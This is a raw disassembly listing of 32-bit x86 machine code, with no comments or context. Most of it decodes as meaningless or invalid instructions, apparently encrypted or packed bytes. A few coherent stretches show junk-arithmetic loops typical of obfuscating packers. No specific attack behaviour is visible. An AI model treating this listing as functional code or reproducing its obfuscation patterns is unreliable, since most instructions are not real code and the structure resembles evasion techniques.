  407c01:	(bad)  
  407c02:	es stos DWORD PTR es:[edi],eax
  407c04:	mov    ds:0xbf56baa0,eax
  407c09:	lds    ecx,FWORD PTR [edx+0x5d]
  407c0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c0d:	lods   al,BYTE PTR ds:[esi]
  407c0e:	push   es
  407c0f:	pop    ebx
  407c10:	push   ebp
  407c11:	dec    edi
  407c12:	add    dl,BYTE PTR ds:0x6f561514
  407c18:	xchg   edi,ebp
  407c1a:	fs stos BYTE PTR es:[edi],al
  407c1c:	or     ebp,DWORD PTR fs:[ecx+0x7e]
  407c20:	add    eax,0xd156ca9a
  407c25:	push   ecx
  407c26:	clc    
  407c27:	and    BYTE PTR [edx+0x5f],bl
  407c2a:	pop    eax
  407c2b:	aas    
  407c2c:	stos   BYTE PTR es:[edi],al
  407c2d:	out    0xf9,al
  407c2f:	out    dx,al
  407c30:	lods   eax,DWORD PTR ds:[esi]
  407c31:	sbb    BYTE PTR [ecx],bh
  407c33:	(bad)  
  407c35:	lea    edi,cs:[edx]
  407c38:	cmp    DWORD PTR [eax-0x473535a5],ebp
  407c3e:	pop    ebx
  407c3f:	fdivrp st(5),st
  407c41:	cld    
  407c42:	sub    eax,0xc6784418
  407c47:	cmp    al,0xe7
  407c49:	daa    
  407c4a:	aaa    
  407c4b:	sbb    eax,0xdaddcc80
  407c50:	data16 (bad) 
  407c52:	(bad)  
  407c53:	arpl   WORD PTR [ebp+0x9],sp
  407c56:	lods   eax,DWORD PTR ds:[esi]
  407c57:	shl    DWORD PTR [ecx+0x5e],1
  407c5a:	pop    eax
  407c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c5c:	cs sti 
  407c5e:	sbb    eax,0x36adc7c9
  407c63:	repnz adc al,0x47
  407c66:	inc    edx
  407c67:	inc    eax
  407c68:	jle    0x407cbf
  407c6a:	out    0x82,eax
  407c6c:	mov    al,ds:0x27eaee18
  407c71:	test   eax,0x4c3d8aca
  407c76:	lds    ebx,FWORD PTR [ecx+ebp*1-0x77]
  407c7a:	(bad)  
  407c7b:	push   ebx
  407c7c:	adc    eax,0x90b6632f
  407c81:	adc    bh,BYTE PTR [edx+eax*8+0x7]
  407c85:	add    eax,0x480dd8bc
  407c8a:	shl    DWORD PTR [edx-0x75],0xdf
  407c8e:	sbb    DWORD PTR ds:0x37afe4b6,esi
  407c94:	jmp    DWORD PTR [ebx+edx*1+0x29]
  407c98:	jmp    0xab77266a
  407c9d:	and    esi,DWORD PTR [eax]
  407c9f:	dec    esp
  407ca0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ca1:	mov    edi,0xfb87f36d
  407ca6:	imul   DWORD PTR [ecx+0x331cad80]
  407cac:	pop    ds
  407cad:	dec    ecx
  407cae:	add    dl,BYTE PTR [eax+0x57832895]
  407cb4:	outs   dx,DWORD PTR ds:[esi]
  407cb5:	loopne 0x407c86
  407cb7:	neg    DWORD PTR [ebp-0x5bbdbc5c]
  407cbd:	into   
  407cbe:	dec    ebx
  407cbf:	popf   
  407cc0:	add    al,0x19
  407cc2:	pop    ss
  407cc3:	pop    ebp
  407cc4:	or     ch,BYTE PTR [ebx-0x6]
  407cc7:	pop    edx
  407cc8:	clc    
  407cc9:	in     eax,0x17
  407ccb:	ins    DWORD PTR es:[edi],dx
  407ccc:	es mov edx,0x84351e29
  407cd2:	(bad)  
  407cd3:	std    
  407cd4:	clc    
  407cd5:	out    0x1a,eax
  407cd7:	je     0x407d1d
  407cd9:	jge    0x407cdf
  407cdb:	dec    edi
  407cdc:	adc    al,0x9
  407cde:	and    BYTE PTR [eax+0x5d],bh
  407ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ce2:	(bad)  
  407ce3:	loopne 0x407c71
  407ce5:	dec    edi
  407ce6:	call   0xa10c93be
  407ceb:	xchg   ebx,eax
  407cec:	popa   
  407ced:	pop    sp
  407cef:	pop    ds
  407cf0:	pop    edi
  407cf1:	pop    esp
  407cf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cf3:	and    al,0x71
  407cf5:	ss sbb eax,0xce1ad68
  407cfb:	sbb    bh,BYTE PTR [esi-0x4a]
  407cfe:	imul   esi,DWORD PTR [edx+eiz*4+0x31],0xffffffb9
  407d03:	pop    edi
  407d04:	cmp    ebx,ebp
  407d06:	jecxz  0x407d15
  407d08:	mul    DWORD PTR [ebp-0xbfbbda5]
  407d0e:	cmp    DWORD PTR [ebp+0x5f],edi
  407d11:	push   edi
  407d12:	mov    bl,BYTE PTR [esi-0x67]
  407d15:	push   edi
  407d16:	adc    BYTE PTR [edi-0x3ae732dc],dl
  407d1c:	mov    ebx,0x98f169bb
  407d21:	retf   0x83c6
  407d24:	icebp  
  407d25:	lds    ecx,FWORD PTR [esi+ebp*8-0x48561177]
  407d2c:	sbb    al,0x2f
  407d2e:	cld    
  407d2f:	add    ecx,edi
  407d31:	lahf   
  407d32:	inc    esp
  407d33:	mov    ds:0x5110fdca,al
  407d38:	popa   
  407d39:	mov    ecx,0x9e8b50a5
  407d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d3f:	mov    ecx,0x1fec0c0d
  407d44:	pop    ds
  407d45:	add    al,0x7a
  407d47:	test   al,0x7f
  407d49:	jbe    0x407d51
  407d4b:	and    eax,0x8f30463
  407d50:	int    0x43
  407d52:	mov    ds:0xc5436981,al
  407d57:	adc    esi,DWORD PTR [edx]
  407d59:	pop    edx
  407d5a:	push   ebp
  407d5b:	adc    DWORD PTR [edx],ebp
  407d5d:	(bad)  
  407d5e:	push   edi
  407d5f:	out    0xe3,al
  407d61:	sub    BYTE PTR [edx],dl
  407d63:	imul   esi,DWORD PTR [ecx-0x3d903ecd],0x19
  407d6a:	adc    dh,BYTE PTR [edi-0x39]
  407d6d:	stos   DWORD PTR es:[edi],eax
  407d6e:	(bad)  
  407d70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d71:	push   eax
  407d72:	cmp    al,0x2f
  407d74:	dec    eax
  407d75:	rol    DWORD PTR [edx-0x5bb902e4],0xa1
  407d7c:	inc    eax
  407d7d:	in     eax,0x52
  407d7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d80:	mov    ecx,0x72377e95
  407d85:	mov    es,WORD PTR [edi-0x39]
  407d88:	add    BYTE PTR [edx-0x19db5ed1],bh
  407d8e:	ins    BYTE PTR es:[edi],dx
  407d8f:	cmp    DWORD PTR [ecx+0x38],eax
  407d92:	xor    ah,BYTE PTR [esi]
  407d94:	aad    0xcd
  407d96:	sar    DWORD PTR [ebp+0x33],0x45
  407d9a:	or     eax,0xad5b6611
  407d9f:	out    0x8c,eax
  407da1:	jmp    DWORD PTR [ebx+0xf68d845]
  407da7:	mov    al,ds:0x59e9eee4
  407dac:	mov    ds,eax
  407dae:	repnz dec edx
  407db0:	add    ah,BYTE PTR [eax+ecx*1]
  407db3:	mov    bl,0x88
  407db5:	xor    cl,dh
  407db7:	(bad)  
  407dba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dbb:	and    al,0x2d
  407dbd:	test   BYTE PTR [ebx+0x242901d9],ah
  407dc3:	in     eax,dx
  407dc4:	cmc    
  407dc5:	sub    esp,DWORD PTR [esi-0x4b]
  407dc8:	ret    
  407dc9:	xor    BYTE PTR [eax-0x768d8a90],dh
  407dcf:	aas    
  407dd0:	mov    al,0xc1
  407dd2:	fnstsw WORD PTR ds:0x4d4494c4
  407dd8:	dec    ecx
  407dd9:	cmc    
  407dda:	cmp    BYTE PTR [esi+edx*1+0x168cfd0],0xdf
  407de2:	(bad)  
  407de3:	push   ds
  407de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407de5:	push   0x44
  407de7:	or     BYTE PTR [ecx],0x5c
  407dea:	(bad)  
  407deb:	std    
  407dec:	ror    DWORD PTR gs:[eax+ebx*1+0x77],1
  407df1:	mul    DWORD PTR [edi-0x31174b26]
  407df7:	mov    al,ds:0x6f7f4c13
  407dfc:	mov    BYTE PTR [ecx-0x43f94b24],cl
  407e02:	jb     0x407d97
  407e04:	and    eax,0x915a5dec
  407e09:	xor    edi,esi
  407e0b:	shl    BYTE PTR [esi+0x73a6a701],cl
  407e11:	xor    eax,0x59c04ace
  407e16:	mov    eax,ds:0x2bed7318
  407e1b:	xchg   edx,eax
  407e1c:	cmp    DWORD PTR [ecx-0xb408b1b],0x9a061e8f
  407e26:	mov    esp,0x5798333b
  407e2b:	fwait
  407e2c:	sbb    BYTE PTR [eax+0x61795b33],al
  407e32:	je     0x407de1
  407e34:	push   es
  407e35:	call   0x898abc88
  407e3a:	xchg   ebx,eax
  407e3b:	into   
  407e3c:	int3   
  407e3d:	jp     0x407dd4
  407e3f:	mov    ch,al
  407e41:	mov    ds:0x14211a08,al
  407e46:	test   esi,esp
  407e48:	or     BYTE PTR [eax-0x27],ah
  407e4b:	stc    
  407e4c:	sub    BYTE PTR [ebp-0x1f49621b],dl
  407e52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e53:	cwde   
  407e54:	jnp    0x407e28
  407e56:	aaa    
  407e57:	gs inc ecx
  407e59:	sar    DWORD PTR [esi-0x5dd9f60e],0x70
  407e60:	and    al,0x96
  407e62:	mov    dl,0x4d
  407e64:	aas    
  407e65:	call   DWORD PTR [esi]
  407e67:	(bad)  
  407e68:	jecxz  0x407e23
  407e6a:	inc    ebx
  407e6b:	inc    ebx
  407e6c:	sbb    eax,0x628a9a6
  407e71:	and    DWORD PTR [edi*8+0x6c8216cd],edx
  407e78:	pinsrw mm2,WORD PTR [esi+0x1c],0x74
  407e7d:	sbb    DWORD PTR [eax-0x5f3f516d],0x8277442a
  407e87:	pop    ebx
  407e88:	loopne 0x407e6b
  407e8a:	adc    cl,dh
  407e8c:	jl     0x407ec6
  407e8e:	sub    eax,0x22c34a55
  407e93:	pop    ebx
  407e94:	ins    BYTE PTR es:[edi],dx
  407e95:	test   al,0xfd
  407e97:	push   edx
  407e98:	fs test al,0x4c
  407e9b:	xor    ah,dh
  407e9d:	add    BYTE PTR [edi+0x2a48244],bh
  407ea3:	mov    edx,0xc6e0e0f3
  407ea8:	icebp  
  407ea9:	sbb    cl,BYTE PTR [esi]
  407eab:	mov    BYTE PTR [ebx+0x17d047a2],bh
  407eb1:	push   cs
  407eb2:	inc    bl
  407eb4:	call   0x49b3:0x69269727
  407ebb:	cwde   
  407ebc:	xchg   ebp,eax
  407ebd:	push   ebp
  407ebe:	sbb    DWORD PTR [eax-0x5],0xffffffa5
  407ec2:	fwait
  407ec3:	adc    ah,ch
  407ec5:	hlt    
  407ec6:	gs jno 0x407ee5
  407ec9:	inc    esp
  407eca:	push   esi
  407ecb:	sub    al,0x9d
  407ecd:	idiv   BYTE PTR [ebp+0x1b]
  407ed0:	pop    ds
  407ed1:	fsubr  DWORD PTR [ebp+0x3]
  407ed4:	shr    BYTE PTR [ecx+0x608fea41],1
  407eda:	jns    0x407f3c
  407edc:	scas   eax,DWORD PTR es:[edi]
  407edd:	sub    eax,0x81fff2a2
  407ee2:	jne    0x407ee0
  407ee4:	mov    eax,0x660e149e
  407ee9:	mov    eax,DWORD PTR [ebp-0x8]
  407eec:	push   DWORD PTR [ebp+0x8]
  407eef:	call   0x407f00
  407ef4:	test   eax,eax
  407ef6:	je     0x407ee1
  407efc:	leave  
  407efd:	ret    0x4
  407f00:	push   ebp
  407f01:	mov    ebp,esp
  407f03:	sub    esp,0x2c
  407f06:	or     DWORD PTR ds:0x43366f,edi
  407f0c:	jmp    0x408093
  407f11:	outs   dx,DWORD PTR ds:[esi]
  407f12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f13:	ins    BYTE PTR es:[edi],dx
  407f14:	inc    edi
  407f15:	jne    0x407f6c
  407f17:	jne    0x407ecf
  407f19:	push   ss
  407f1a:	push   ds
  407f1b:	mov    ch,0xcc
  407f1d:	loope  0x407ee3
  407f1f:	imul   ebp,DWORD PTR [edx],0x7e7ed62a
  407f25:	in     al,0x7f
  407f27:	jle    0x407fa7
  407f29:	adc    al,0xf6
  407f2b:	dec    ecx
  407f2c:	mov    DWORD PTR [edx],edi
  407f2e:	div    DWORD PTR [ebp+0x71245ddf]
  407f34:	pop    ebp
  407f35:	(bad)  
  407f36:	push   esp
  407f37:	pop    esp
  407f38:	push   0xffffffa9
  407f3a:	dec    ebp
  407f3b:	jp     0x407f0b
  407f3d:	sub    al,0x49
  407f3f:	xchg   ebp,eax
  407f40:	imul   edx,DWORD PTR [esi],0x57
  407f43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f44:	lods   eax,DWORD PTR ds:[esi]
  407f45:	mov    dh,0x1a
  407f47:	icebp  
  407f48:	icebp  
  407f49:	daa    
  407f4a:	xchg   ecx,eax
  407f4b:	xchg   ebx,eax
  407f4c:	jb     0x407fc9
  407f4e:	cmc    
  407f4f:	push   esi
  407f50:	adc    al,0xd1
  407f52:	jecxz  0x407f60
  407f54:	dec    edi
  407f55:	nop
  407f56:	push   esp
  407f57:	call   0x675c:0x8b93cf8f
  407f5e:	push   ebp
  407f5f:	loopne 0x407f07
  407f61:	pop    ecx
  407f62:	and    cl,ch
  407f64:	adc    eax,0xbef38260
  407f69:	fnstcw WORD PTR [ebx]
  407f6b:	das    
  407f6c:	imul   DWORD PTR [esi+0x61]
  407f6f:	or     eax,DWORD PTR [ecx+0x7]
  407f72:	sub    al,0xcb
  407f74:	xchg   DWORD PTR [eax+0x374adfdd],eax
  407f7a:	(bad)  
  407f7c:	xlat   BYTE PTR ds:[ebx]
  407f7d:	out    0xee,eax
  407f7f:	rol    BYTE PTR [edi+0x7d16aa22],cl
  407f85:	fisubr DWORD PTR [eax]
  407f87:	adc    DWORD PTR [esi],esi
  407f89:	push   edi
  407f8a:	loopne 0x407ff0
  407f8c:	ret    0x8a2
  407f8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f90:	mov    bh,0xb6
  407f92:	jmp    0x53d6:0xd68039c2
  407f99:	add    DWORD PTR [edi+0x6c],0x1
  407f9d:	pop    esi
  407f9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f9f:	add    esp,edx
  407fa1:	into   
  407fa2:	test   al,0x0
  407fa4:	(bad)  
  407fa5:	imul   esp,DWORD PTR [esi-0xe393b18],0x48920dcf
  407faf:	stc    
  407fb0:	jae    0x407f5b
  407fb2:	mov    ecx,0x6e043a0a
  407fb7:	push   ecx
  407fb8:	lods   ax,WORD PTR ds:[esi]
  407fba:	fidiv  WORD PTR [ebx-0x30]
  407fbd:	sub    DWORD PTR [ebx-0xe],0xffffff98
  407fc1:	mov    cl,0xdb
  407fc3:	fisub  DWORD PTR [ebp+0x1]
  407fc6:	sub    ah,BYTE PTR [ebp+0x2d63e119]
  407fcc:	out    dx,al
  407fcd:	dec    esp
  407fce:	es mov edi,0x4606e6f0
  407fd4:	pushf  
  407fd5:	js     0x408034
  407fd7:	push   DWORD PTR [edx+0x4a1232a9]
  407fdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fde:	adc    eax,DWORD PTR [eax]
  407fe0:	pop    edx
  407fe1:	cld    
  407fe2:	sub    bh,bl
  407fe4:	mov    ds:0xee0de836,al
  407fe9:	adc    eax,0x849e2105
  407fee:	sar    dl,0x71
  407ff1:	shl    DWORD PTR [edi+0x6e79857a],cl
  407ff7:	aad    0x5e
  407ff9:	shufps xmm3,XMMWORD PTR [ebx],0x5e
  407ffd:	lock dec ebx
  407fff:	int    0x19
  408001:	mov    ebp,0x6a019fd0
  408006:	add    bl,BYTE PTR [esi]
  408008:	sub    DWORD PTR [ebp-0x761b3aa9],ecx
  40800e:	mov    DWORD PTR [esp+ecx*4-0x51],0x3b2b9b59
  408016:	(bad)  
  408017:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408018:	mov    esp,0xfb92b8bd
  40801d:	daa    
  40801e:	adc    edi,DWORD PTR [eax]
  408020:	mov    eax,0xf67b5fae
  408025:	xchg   ebp,eax
  408026:	into   
  408027:	push   edx
  408028:	push   cs
  408029:	cdq    
  40802a:	xchg   ebp,eax
  40802b:	cmp    BYTE PTR ds:0x8028c8dc,dl
  408031:	mov    ecx,0x1931af9a
  408036:	into   
  408037:	mov    esi,0x9c1a6635
  40803c:	mov    edx,DWORD PTR [ebp+0x1622e997]
  408042:	and    DWORD PTR [edi],edi
  408044:	or     al,0x7c
  408046:	xchg   ebp,eax
  408047:	leave  
  408048:	popa   
  408049:	push   edx
  40804a:	lods   eax,DWORD PTR ds:[esi]
  40804b:	cli    
  40804c:	push   ecx
  40804d:	popa   
  40804e:	ret    0x425f
  408051:	jmp    0x680d8f6b
  408056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408057:	pop    ds
  408058:	int3   
  408059:	outs   dx,DWORD PTR ds:[esi]
  40805a:	mov    ecx,DWORD PTR [ebp+0x11d3bdeb]
  408060:	mov    esi,0xad5330e0
  408065:	and    edi,edx
  408067:	sti    
  408068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408069:	hlt    
  40806a:	je     0x40807a
  40806c:	inc    eax
  40806d:	push   cs
  40806e:	cmp    dh,0x21
  408071:	and    BYTE PTR [edx],0xa6
  408074:	outs   dx,BYTE PTR ds:[esi]
  408075:	or     DWORD PTR [ebx],0xffffffa8
  408078:	mov    BYTE PTR [esi+ebp*8+0x15],dh
  40807c:	dec    ebx
  40807d:	retf   
  40807e:	jmp    0x6947:0xebb96b8c
  408085:	icebp  
  408086:	lods   eax,DWORD PTR ds:[esi]
  408087:	inc    edx
  408088:	jmp    0xebd8ebe7
  40808d:	inc    ebx
  40808e:	mov    ch,BYTE PTR ds:0xc765a98b
  408094:	inc    ebp
  408095:	clc    
  408096:	xor    al,BYTE PTR [ebp-0x38be0764]
  40809c:	inc    ebp
  40809d:	in     al,dx
  40809e:	xor    DWORD PTR [ebp+0x77b8f89c],eax
  4080a4:	xchg   ebp,eax
  4080a5:	add    BYTE PTR [eax],al
  4080a7:	mov    ecx,DWORD PTR ds:0x433627
  4080ad:	xor    DWORD PTR ds:0x433733,ecx
  4080b3:	mov    WORD PTR [ebp-0x4],ax
  4080b7:	inc    DWORD PTR ds:0x433737
  4080bd:	lea    eax,[ebp-0x24]
  4080c0:	mov    DWORD PTR [ebp-0x28],eax
  4080c3:	sbb    ecx,0x45b9
  4080c9:	mov    eax,DWORD PTR [ebp+0x8]
  4080cc:	mov    DWORD PTR [ebp-0x20],eax
  4080cf:	push   ebx
  4080d0:	movzx  ecx,WORD PTR ds:0x4336fb
  4080d7:	add    ecx,DWORD PTR ds:0x43361b
  4080dd:	mov    DWORD PTR ds:0x4336fb,ecx
  4080e3:	lea    eax,[ebp-0x18]
  4080e6:	mov    DWORD PTR [ebp-0x1c],eax
  4080e9:	mov    eax,DWORD PTR [ebp-0x1c]
  4080ec:	and    DWORD PTR ds:0x433667,edx
  4080f2:	push   esi
  4080f3:	or     DWORD PTR ds:0x433683,ebx
  4080f9:	push   edi
  4080fa:	add    DWORD PTR ds:0x43361f,ebx
  408100:	mov    edi,0xf89f2da9
  408105:	mov    DWORD PTR [eax],edi
  408107:	and    DWORD PTR ds:0x4336b3,0x0
  408111:	jmp    0x408121
  408116:	mov    eax,ds:0x4336b3
  40811b:	inc    eax
  40811c:	mov    ds:0x4336b3,eax
  408121:	cmp    DWORD PTR ds:0x4336b3,0x11
  408128:	jae    0x408163
  40812e:	cmp    DWORD PTR ds:0x4336b3,0x4
  408135:	jne    0x408146
  40813b:	push   0x1543
  408140:	call   DWORD PTR ds:0x412390
  408146:	cmp    DWORD PTR ds:0x4336b3,0x3
  40814d:	jne    0x40815e
  408153:	mov    eax,ds:0x4336b3
  408158:	inc    eax
  408159:	mov    ds:0x4336b3,eax
  40815e:	jmp    0x408116
  408163:	mov    eax,DWORD PTR [ebp-0x14]
  408166:	mov    ebx,DWORD PTR [ebp-0x8]
  408169:	mov    ecx,0x7510854
  40816e:	mov    DWORD PTR ds:0x43366b,0x500e
  408178:	jmp    0x4082ff
  40817d:	xor    dl,BYTE PTR [esi+0x23]
  408180:	inc    edi
  408181:	arpl   WORD PTR [ebx+0x72],si
  408184:	jae    0x408123
  408186:	aas    
  408187:	or     eax,0x492cfb8b
  40818c:	mov    WORD PTR [eax-0x1b818129],ss
  408192:	jg     0x408212
  408194:	jle    0x40814d
  408196:	inc    ecx
  408197:	dec    ebx
  408198:	repnz add DWORD PTR [ecx+0x4a],0xffffffca
  40819d:	test   eax,0x6ba49186
  4081a2:	inc    BYTE PTR ds:0xa2297f38
  4081a8:	push   esp
  4081a9:	xchg   edx,eax
  4081aa:	inc    esi
  4081ab:	xchg   ecx,eax
  4081ac:	dec    ebx
  4081ad:	jge    0x4081b6
  4081af:	test   al,0xdf
  4081b1:	pop    ebp
  4081b2:	nop
  4081b3:	pop    ebp
  4081b4:	je     0x408168
  4081b6:	mov    dh,0x8
  4081b8:	mov    dh,0xed
  4081ba:	sub    al,0xe0
  4081bc:	xlat   BYTE PTR ds:[ebx]
  4081bd:	jb     0x408196
  4081bf:	(bad)  
  4081c0:	xor    BYTE PTR [ecx],ch
  4081c2:	lock and eax,DWORD PTR [ebx-0x23df41db]
  4081c9:	repz xchg edi,eax
  4081cb:	adc    ecx,DWORD PTR [edi+0x8963464]
  4081d1:	cmp    eax,0x748947d5
  4081d6:	jbe    0x4081bd
  4081d8:	cmp    bh,bl
  4081da:	push   edi
  4081db:	inc    edx
  4081dc:	adc    edi,DWORD PTR [edi]
  4081de:	jno    0x408198
  4081e0:	mov    BYTE PTR [ecx+ecx*1],bl
  4081e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081e4:	mov    dh,0x66
  4081e6:	push   0xffffffcc
  4081e8:	leave  
  4081e9:	inc    edx
  4081ea:	sbb    eax,0x26a3d144
  4081ef:	in     eax,0x12
  4081f1:	jg     0x408193
  4081f3:	test   BYTE PTR [eax],cl
  4081f5:	fdivr  st,st(1)
  4081f7:	dec    ebp
  4081f8:	xlat   BYTE PTR ds:[ebx]
  4081f9:	rep lods al,BYTE PTR ds:[esi]
  4081fb:	pop    es
  4081fc:	hlt    
  4081fd:	and    ax,0x9975
  408201:	and    eax,0x9f9ae2bd
  408206:	jecxz  0x408225
  408208:	jns    0x408257
  40820a:	repnz adc eax,0xd9c06f98
  408210:	push   ss
  408211:	pop    esp
  408212:	scas   al,BYTE PTR es:[edi]
  408213:	pop    ss
  408214:	les    eax,FWORD PTR [ecx-0x32]
  408217:	aaa    
  408218:	dec    eax
  408219:	std    
  40821a:	adc    dh,al
  40821c:	es lock sub al,0x69
  408220:	cmp    al,0xae
  408222:	adc    dl,BYTE PTR [edi-0x491621d4]
  408228:	jo     0x408224
  40822a:	fiadd  DWORD PTR [ebp+ebp*2+0x56835f77]
  408231:	and    BYTE PTR ds:[ecx],bh
  408234:	adc    DWORD PTR [edx],esi
  408236:	(bad)  
  408237:	shr    DWORD PTR [eax-0x4c],1
  40823a:	imul   edi,DWORD PTR [ebx],0x402849a4
  408240:	arpl   WORD PTR [edi-0x34304031],si
  408246:	arpl   WORD PTR [esi+0xe2abf62],si
  40824c:	sub    al,0xb6
  40824e:	fdiv   QWORD PTR [ebp-0x71]
  408251:	in     eax,0x40
  408253:	jb     0x4082a6
  408255:	push   cs
  408256:	mov    ds:0x5fdb1d9c,eax
  40825b:	push   ecx
  40825c:	lods   eax,DWORD PTR ds:[esi]
  40825d:	idiv   BYTE PTR [esi+0xd382709]
  408263:	mov    ch,0xd0
  408265:	xchg   DWORD PTR [ecx+edx*4-0x6fca936e],edi
  40826c:	push   ecx
  40826d:	jns    0x4082ab
  40826f:	inc    eax
  408270:	xor    al,0xcd
  408272:	lea    eax,[edi-0x4e9f2244]
  408278:	fld    DWORD PTR [esi+0x199de77b]
  40827e:	out    dx,eax
  40827f:	sbb    ecx,DWORD PTR [ebx-0x60]
  408282:	cdq    
  408283:	(bad)  [eax+ecx*8]
  408286:	jmp    0x20600f10
  40828b:	jae    0x40826c
  40828d:	mov    BYTE PTR [ebp+0x2f],al
  408290:	dec    ebp
  408291:	pusha  
  408292:	stc    
  408293:	mov    bl,0xe4
  408295:	fmul   QWORD PTR [eax+0x36]
  408298:	lds    eax,FWORD PTR [esi+0x71313aed]
  40829e:	jge    0x408247
  4082a0:	xor    al,0xb3
  4082a2:	push   edx
  4082a3:	ret    
  4082a4:	push   ss
  4082a5:	xchg   esp,eax
  4082a6:	pcmpeqb mm4,mm4
  4082a9:	inc    edx
  4082aa:	push   edi
  4082ab:	inc    edx
  4082ac:	or     BYTE PTR [esi-0xa2ae7a],ah
  4082b2:	mov    cl,0x3e
  4082b4:	cmp    eax,0xb8a4738d
  4082b9:	call   0x5b17:0x37748f84
  4082c0:	enter  0x91be,0x96
  4082c4:	jg     0x4082e6
  4082c6:	aam    0x6d
  4082c8:	lahf   
  4082c9:	jmp    0x40830a
  4082cb:	jmp    0xe7bf:0xd4193a9c
  4082d2:	sub    al,0xf8
  4082d4:	push   ecx
  4082d5:	test   BYTE PTR [ecx+0x25],dl
  4082d8:	sar    DWORD PTR [ecx+eax*8],0x14
  4082dc:	cwde   
  4082dd:	mov    dh,0xc7
  4082df:	dec    ebp
  4082e0:	push   ebp
  4082e1:	sbb    BYTE PTR [ecx],dl
  4082e3:	pop    ebp
  4082e4:	pop    ds
  4082e5:	pop    ss
  4082e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082e7:	mov    cl,dh
  4082e9:	mov    ?,WORD PTR [eax+0x45]
  4082ec:	jg     0x4082ec
  4082ee:	ret    
  4082ef:	daa    
  4082f0:	push   ebx
  4082f1:	ja     0x4082bb
  4082f3:	sbb    eax,0xa07f7546
  4082f8:	dec    esi
  4082f9:	add    bh,BYTE PTR [edi-0x3cbe6468]
  4082ff:	xor    eax,ecx
  408301:	and    DWORD PTR ds:0x43367f,0x1370
  40830b:	mov    esi,0x32729b
  408310:	add    DWORD PTR ds:0x433623,0x35ec
  40831a:	xor    ebx,ecx
  40831c:	xor    DWORD PTR ds:0x4336af,0x433743
  408326:	xor    edx,edx
  408328:	add    DWORD PTR ds:0x4336bf,0x300c
  408332:	add    eax,esi
  408334:	add    ebx,esi
  408336:	div    ebx
  408338:	mov    DWORD PTR ds:0x43367b,0x2005
  408342:	mov    edx,DWORD PTR [ebp-0x20]
  408345:	mov    DWORD PTR ds:0x43361b,0x2cd7
  40834f:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  408356:	mov    DWORD PTR ds:0x4336ff,0x77f0
  408360:	cmp    eax,DWORD PTR [edx]
  408362:	mov    DWORD PTR ds:0x433673,0x5769
  40836c:	jmp    0x4084f3
  408371:	or     ebx,ecx
  408373:	add    DWORD PTR [ecx+eax*8],ecx
  408376:	aam    0x11
  408378:	retf   
  408379:	imul   esp,edx,0xffffffd8
  40837c:	mov    eax,0xa112f19a
  408381:	push   es
  408382:	aad    0x7e
  408384:	jle    0x40836a
  408386:	jg     0x408406
  408388:	jle    0x40839a
  40838a:	pop    ss
  40838b:	push   esp
  40838c:	rcl    BYTE PTR [edx+0x62],0x4
  408390:	or     BYTE PTR [ebp+edx*1+0x71],cl
  408394:	mov    edi,0x871142f
  408399:	jno    0x4083a1
  40839b:	fnstsw WORD PTR [eax-0x8]
  40839e:	dec    ebp
  40839f:	int    0xb0
  4083a1:	adc    esi,DWORD PTR [ecx+edi*4]
  4083a4:	mov    ecx,0x35dbe587
  4083a9:	or     al,cl
  4083ab:	daa    
  4083ac:	xchg   ebp,eax
  4083ad:	mov    al,ds:0x4388ae43
  4083b2:	ds repnz dec edx
  4083b5:	out    dx,eax
  4083b6:	jge    0x408380
  4083b8:	or     DWORD PTR [esi],esi
  4083ba:	cli    
  4083bb:	out    0xa1,al
  4083bd:	retf   
  4083be:	and    eax,0x5d0c9372
  4083c3:	pop    eax
  4083c4:	push   ss
  4083c5:	idiv   DWORD PTR [edx+0x23b26e94]
  4083cb:	pop    ebx
  4083cc:	arpl   WORD PTR [eax],ax
  4083ce:	push   edx
  4083cf:	ins    BYTE PTR es:[edi],dx
  4083d0:	popf   
  4083d1:	mov    ch,0x69
  4083d3:	(bad)  
  4083d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4083d6:	mov    cl,0x45
  4083d8:	xchg   DWORD PTR [eax+0x11],ebx
  4083db:	push   edi
  4083dc:	mov    DWORD PTR [eax],esi
  4083de:	mov    esp,0xa25f16f3
  4083e3:	mov    edx,0x8bd84a3
  4083e8:	pushf  
  4083e9:	xor    ecx,DWORD PTR [edx-0xb]
  4083ec:	xchg   edx,eax
  4083ed:	jb     0x408386
  4083ef:	mov    ecx,0x9134b006
  4083f4:	sub    DWORD PTR [edx+ebx*2+0x6d],edx
  4083f8:	fcmovbe st,st(6)
  4083fa:	xor    DWORD PTR [ebx+0x7c],edi
  4083fd:	push   esi
  4083fe:	sub    ch,bh
  408400:	xchg   edi,eax
  408401:	cmc    
  408402:	xchg   esi,eax
  408403:	call   0x4fd8:0xc26d4c54
  40840a:	cwde   
  40840b:	adc    eax,eax
  40840d:	and    DWORD PTR [eax+0x4f4840f0],esi
  408413:	inc    ebx
  408414:	pop    ds
  408415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408416:	jne    0x4083a5
  408418:	push   edx
  408419:	ins    DWORD PTR es:[edi],dx
  40841a:	std    
  40841b:	xor    edi,DWORD PTR [ecx+0x2f]
  40841e:	mov    edx,cr3
  408421:	sahf   
  408422:	call   0xa69e992f
  408427:	js     0x40842f
